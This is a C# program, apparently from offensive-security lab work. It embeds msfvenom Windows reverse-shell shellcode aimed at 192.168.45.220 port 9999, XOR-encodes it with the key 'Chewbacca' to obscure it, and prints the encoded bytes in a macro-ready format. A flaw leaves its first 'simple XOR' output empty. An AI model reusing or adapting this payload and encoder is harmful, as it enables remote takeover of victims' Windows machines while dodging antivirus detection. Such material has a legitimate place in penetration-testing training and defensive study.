﻿using System.Text;

namespace Helper
{
    class Program
    {
        static void Main(string[] args)
        {
            //msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.220 LPORT=9999 exitfunc=thread -f csharp
            byte[] buf = new byte[324] {0xfc,0xe8,0x82,0x00,0x00,0x00,
            0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,
            0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
            0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,
            0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,
            0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,
            0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,
            0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,
            0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,
            0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,
            0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,
            0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,
            0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,
            0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,
            0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,
            0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,
            0x97,0x6a,0x05,0x68,0xc0,0xa8,0x2d,0xdc,0x68,0x02,0x00,0x27,
            0x0f,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,
            0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,
            0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x68,0x63,0x6d,0x64,0x00,0x89,
            0xe3,0x57,0x57,0x57,0x31,0xf6,0x6a,0x12,0x59,0x56,0xe2,0xfd,
            0x66,0xc7,0x44,0x24,0x3c,0x01,0x01,0x8d,0x44,0x24,0x10,0xc6,
            0x00,0x44,0x54,0x50,0x56,0x56,0x56,0x46,0x56,0x4e,0x56,0x56,
            0x53,0x56,0x68,0x79,0xcc,0x3f,0x86,0xff,0xd5,0x89,0xe0,0x4e,
            0x56,0x46,0xff,0x30,0x68,0x08,0x87,0x1d,0x60,0xff,0xd5,0xbb,
            0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,
            0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,
            0x6f,0x6a,0x00,0x53,0xff,0xd5};

            byte[] chewbaccaKey = new byte[] { 0x43, 0x68, 0x65, 0x77, 0x62, 0x61, 0x63, 0x6b, 0x61 };
            byte[] encoded1 = new byte[buf.Length];
            byte[] encoded2 = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                //encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF); // cesar
                encoded2[i] = (byte)(buf[i] ^ chewbaccaKey[i % chewbaccaKey.Length]); // xor 'chewbacca' key
            }

            uint counter = 0;
            StringBuilder hex = new StringBuilder(encoded1.Length * 2);
            foreach (byte b in encoded1)
            {
                hex.AppendFormat("{0:D}, ", b);
                counter++;
                if (counter % 50 == 0)
                {
                    hex.AppendFormat("_{0}", Environment.NewLine);
                }
            }
            Console.WriteLine("The payload with simple XOR is: " + hex.ToString());

            counter = 0;
            StringBuilder hex2 = new StringBuilder(encoded2.Length * 2);
            foreach (byte b in encoded2)
            {
                hex2.AppendFormat("{0:D}, ", b);
                counter++;
                if (counter % 50 == 0)
                {
                    hex2.AppendFormat("_{0}", Environment.NewLine);
                }
            }
            Console.WriteLine("The payload with chewbacca XOR is: " + hex2.ToString());
        }
    }
}